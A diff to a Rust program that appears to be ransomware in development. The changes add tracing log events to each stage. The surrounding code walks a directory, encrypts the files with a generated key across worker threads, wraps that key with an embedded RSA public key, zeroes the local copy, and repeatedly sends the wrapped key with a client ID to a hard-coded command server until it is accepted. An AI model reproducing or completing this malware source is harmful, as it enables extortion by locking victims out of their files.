@@ -6,6 +6,8 @@ use std::thread::sleep;
 use std::time::Duration;
 use std::vec::Vec;
 use tokio::net::TcpSocket;
+use tracing::{self, event, Level};
+use tracing_subscriber::fmt::Subscriber;
 
 use zeroize::Zeroize;
 
@@ -27,13 +29,21 @@ const PUB_KEY: &[u8] = include_bytes!("..\\pub.key");
 
 #[tokio::main]
 async fn main() {
+    let mut builder = Subscriber::builder();
+    builder = builder.with_thread_ids(true);
+    let subscriber = builder.finish();
+    tracing::subscriber::set_global_default(subscriber).expect("setting tracing default failed");
+    event!(Level::INFO, "-- REACHED STAGE: Tracing Started --");
+
     let mut key = encryptor::generate_key();
     let (s, r) = crossbeam_channel::unbounded();
 
+    event!(Level::INFO, "-- REACHED STAGE: Recurser Start --");
     recurse_directory_with_channel(PathBuf::from("/home/kobiske/Videos/Test Folder/"), &s);
 
     let mut threads = Vec::new();
 
+    event!(Level::INFO, "-- REACHED STAGE: Worker Start --");
     for _ in 0..THREADS {
         let thread_reciever = r.clone();
         let thread_key = key.clone();
@@ -46,6 +56,7 @@ async fn main() {
         let _ = thread.await;
     }
 
+    event!(Level::INFO, "-- REACHED STAGE: Key Wrap --");
     let rsa_key = rsa::Rsa::public_key_from_pem(PUB_KEY).unwrap();
     let p_key = openssl::pkey::PKey::from_rsa(rsa_key).unwrap();
     let encryptor = openssl::encrypt::Encrypter::new(&p_key).unwrap();
@@ -59,6 +70,7 @@ async fn main() {
 
     key.zeroize(); // zero out key, not needed anymore
 
+    event!(Level::INFO, "-- REACHED STAGE: Networking --");
     let mut register_blob = comms::Message::RegisterClient((ucid, encrypted.as_slice())).to_req();
 
     let addr = SERVER_IP.parse().unwrap();
@@ -66,38 +78,49 @@ async fn main() {
     let socket = TcpSocket::new_v4().unwrap();
     let mut stream = socket.connect(addr).await.unwrap();
     let mut read_buff = vec![0; 1024];
+    event!(Level::DEBUG, "-- REACHED STAGE: Transmission Start --");
 
     loop {
+        event!(Level::DEBUG, "Waiting for stream to become writable...");
         if stream.writable().await.is_ok() {
+            event!(Level::DEBUG, "Stream is writable, transmitting!");
             let len = stream.try_write(&register_blob);
             if len.is_err() {
+                event!(Level::ERROR, "Error detected, retrying after 1ms.");
                 // retry immediately, connection appears to be active
                 sleep(Duration::from_millis(1));
                 continue;
             } else if len.as_ref().is_ok_and(|x| *x == 0) {
-                println!(
-                    "Connection dropped by server. Assumed rate limit, retrying after 30 seconds."
+                event!(
+                    Level::WARN,
+                    "Connection dropped by server. Assumed rate limit, reconnecting and retrying after 30 seconds."
                 );
                 sleep(Duration::from_secs(31));
                 let socket = TcpSocket::new_v4().unwrap();
+                event!(Level::DEBUG, "Reconnecting to server...");
                 stream = socket.connect(addr).await.unwrap();
                 continue;
             }
         }
 
+        event!(Level::DEBUG, "Waiting for stream to become readable...");
         if stream.readable().await.is_ok() {
+            event!(Level::DEBUG, "Stream is readable, reading!");
             let len = stream.try_read(&mut read_buff);
 
             if len.is_err() {
+                event!(Level::ERROR, "Error detected, retrying after 1ms.");
                 // retry immediately, connection appears to be active
                 sleep(Duration::from_millis(1));
                 continue;
             } else if len.as_ref().is_ok_and(|x| *x == 0) {
-                println!(
-                    "Connection dropped by server. Assumed rate limit, retrying after 30 seconds."
+                event!(
+                    Level::WARN,
+                    "Connection dropped by server. Assumed rate limit, reconnecting and retrying after 30 seconds."
                 );
                 sleep(Duration::from_secs(31));
                 let socket = TcpSocket::new_v4().unwrap();
+                event!(Level::INFO, "Reconnecting to server...");
                 stream = socket.connect(addr).await.unwrap();
                 continue;
             }
@@ -106,21 +129,31 @@ async fn main() {
 
             match Message::from_req(&mut read_buff[0..len]) {
                 Message::UcidReject(_) => {
+                    event!(
+                        Level::WARN,
+                        "UCID rejected by server. Generating a new one and retrying immediately."
+                    );
                     ucid = generate_ucid().unwrap();
                     register_blob =
                         comms::Message::RegisterClient((ucid, encrypted.as_slice())).to_req();
                 }
                 Message::RateReject() => {
-                    println!(
-                    "Connection dropped by server. Response was rate limit, retrying after 30 seconds."
+                    event!(
+                    Level::WARN,
+                    "Connection dropped by server. Assumed rate limit, reconnecting and retrying after 30 seconds."
                 );
                     sleep(Duration::from_secs(31));
                     let socket = TcpSocket::new_v4().unwrap();
+                    event!(Level::DEBUG, "Reconnecting to server...");
                     stream = socket.connect(addr).await.unwrap();
                     continue;
                 }
                 Message::Accepted(_) => {
-                    println!("Transmission successful, client exiting...");
+                    event!(
+                        Level::INFO,
+                        "Transmission Successful. Client ID is: {}. This application will now exit.",
+                        ucid
+                    );
                     break;
                 }
                 _ => {
